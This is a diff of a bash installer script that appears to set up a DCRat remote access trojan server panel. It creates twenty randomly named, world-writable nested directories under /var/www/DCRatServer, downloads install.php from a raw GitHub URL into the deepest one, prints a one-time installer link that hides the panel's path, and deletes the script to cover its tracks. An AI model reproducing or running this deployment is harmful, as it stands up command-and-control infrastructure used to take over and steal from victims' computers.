@@ -200,29 +200,31 @@ generate_dir_name() {
     echo "$name"
 }
 
-nested_path=""
+nested_path="/var/www/DCRatServer"
 for (( i=1; i<=20; i++ )); do
     dir_name=$(generate_dir_name)
     nested_path="${nested_path}/${dir_name}"
+    sudo mkdir -p "$nested_path" || { log_progress "Error creating directory $nested_path"; exit 1; }
+    sudo chmod 777 "$nested_path" || { log_progress "Error setting permissions for $nested_path"; exit 1; }
+    sudo touch "${nested_path}/index.html" || { log_progress "Error creating index.html in $nested_path"; exit 1; }
 done
 
-sudo rm -rf "$nested_path" > /dev/null 2>&1
-sudo mkdir -p "$nested_path" > /dev/null 2>&1
-sudo chmod -R 777 "$nested_path" > /dev/null 2>&1
-sleep 1
+log_progress "Downloading install.php"
+if ! sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "${nested_path}/install.php"; then
+    log_progress "Error: Failed to download install.php"
+    exit 1
+fi
+sudo chmod 777 "${nested_path}/install.php" || { log_progress "Error setting permissions for install.php"; exit 1; }
 
-sudo find "$nested_path" -type d -exec touch {}/index.html \;
-sleep 1
-
-sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "$nested_path/install.php" > /dev/null 2>&1
-sudo chmod 777 "$nested_path/install.php" > /dev/null 2>&1
-sleep 3
+# Verify installation
+if [ ! -f "${nested_path}/install.php" ]; then
+    log_progress "ERROR: install.php not found at ${nested_path}"
+    exit 1
+fi
 
 elapsed_time=$(( SECONDS - start_time ))
 log "✅ Installation and configuration is successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
-log "🔗 Link to the installer: http://$domain${nested_path}/install.php"
+log "🔗 Link to the installer: http://$domain${nested_path#/var/www/DCRatServer}/install.php"
 log "❕ Link can only be used once."
 
-# Clean up
 sudo rm -- "$0" > /dev/null 2>&1
-sudo rm install.php > /dev/null 2>&1
